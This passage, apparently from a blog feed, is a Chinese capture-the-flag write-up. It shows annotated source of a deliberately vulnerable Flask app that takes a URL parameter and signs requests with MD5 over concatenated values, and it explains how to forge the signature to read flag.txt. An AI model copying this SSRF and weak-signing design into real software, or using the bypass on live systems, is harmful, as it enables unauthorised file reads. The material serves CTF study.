data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            result&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Sign Error&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; result&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;checkSign&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;					&lt;span class=&#34;token comment&#34;&gt;#检查可以看出是调用了 getsign，看是否和 sign 相等&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;getSign&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;action&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;param&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sign&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;False&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token decorator annotation punctuation&#34;&gt;@app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;route&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/geneSign&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; methods&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;GET&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;POST&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;				&lt;span class=&#34;token comment&#34;&gt;#路径之一，可以传参 param，让 action 默认成 scan&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;geneSign&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    param &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; urllib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;unquote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;args&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;param&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    action &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;scan&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; getSign&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;action&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; param&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;63&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;64&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token decorator annotation punctuation&#34;&gt;@app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;route&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/De1ta&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;methods&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;GET&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;POST&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;						&lt;span class=&#34;token comment&#34;&gt;#路径之一，可以通过 cookie 传参 action 和 sign&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;65&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;challenge&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;												&lt;span class=&#34;token comment&#34;&gt;#可以通过 get 传参 param，后面有个 waf 没啥用&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;66&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    action &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; urllib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;unquote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cookies&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;action&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;67&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    param &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; urllib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;unquote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;args&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;param&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;68&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    sign &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; urllib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;unquote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cookies&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;sign&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;69&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    ip &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;remote_addr&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;70&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;waf&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;param&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;71&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;No Hacker!!!!&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;72&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    task &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Task&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;action&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; param&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; sign&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; ip&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;73&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; json&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dumps&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;task&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Exec&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;74&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;75&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token decorator annotation punctuation&#34;&gt;@app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;route&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;76&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;77&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;code.txt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;r&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;							&lt;span class=&#34;token comment&#34;&gt;#根目录，显示原码用的&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;78&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;79&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;scan&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;param&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;												&lt;span class=&#34;token comment&#34;&gt;#scan，配合上面那个扫描文件读取文件用，不管&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;80&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;setdefaulttimeout&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;81&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;82&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; urllib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;urlopen&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;param&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;83&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;84&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Connection Timeout&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;85&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;86&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getSign&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;action&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; param&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;·									&lt;span class=&#34;token comment&#34;&gt;#配合上面使用，把三个东西拼接起来（直接拼接）md5&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;87&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; hashlib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;md5&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;secert_key &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; param &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; action&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;hexdigest&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#显然这里需要利用，来绕过前面的判断 checkSign&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;88&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;89&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;content&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;90&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; hashlib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;md5&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;content&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;hexdigest&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;91&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;92&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;waf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;param&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;93&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    check&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;param&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;strip&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;									&lt;span class=&#34;token comment&#34;&gt;#不能出现这俩字符，没啥用&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;94&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; check&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;startswith&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;gopher&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt; check&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;startswith&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;95&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;96&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;97&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;False&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;98&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;99&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;debug &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;False&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;100&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;run&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;host&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;0.0.0.0&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;port&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;9999&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;（我在代码上标注了一下自己的理解）&lt;/p&gt;
&lt;p&gt;整个代码是要读拼接后的 param，方法是靠 action，来获取 flag.txt&lt;/p&gt;
&lt;p&gt;就是让我们 action=readscan 或者 scanread，只要包含就行，然后文件 param=flag.txt 就能读，只要 sign = 拼接后的 md5 值就行。&lt;/p&gt;
&lt;p&gt;而 sign 在 genesign 里构造就行，让 param=flag.txtread，action 默认赋值 scan 不用管，这样拼接起来就是是需要的 sign，既有 scan 又有 read&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/16/5fBtE3UqxY7jec8.png&#34; alt&gt;&amp;lt;!--p2--&amp;gt;&lt;/p&gt;
&lt;p&gt;读取了 sign 后，抓包改 cookie 值传参，通过路径 / De1ta，就正常传就出来了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/16/1i8YAH3gtzxdv7B.png&#34; alt&gt;&amp;lt;!--p3--&amp;gt;&lt;/p&gt;
&lt;p&gt;说实话，思路确实不难，主要就是记录一下代码，梳理下代码。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;有不懂的代码再补充&lt;/p&gt;
&lt;p&gt;END&lt;/p&gt;
</content>
        <category term="代码审计" />
        <updated>2021-08-16T12:35:41.221Z</updated>
    </entry>
    <entry>
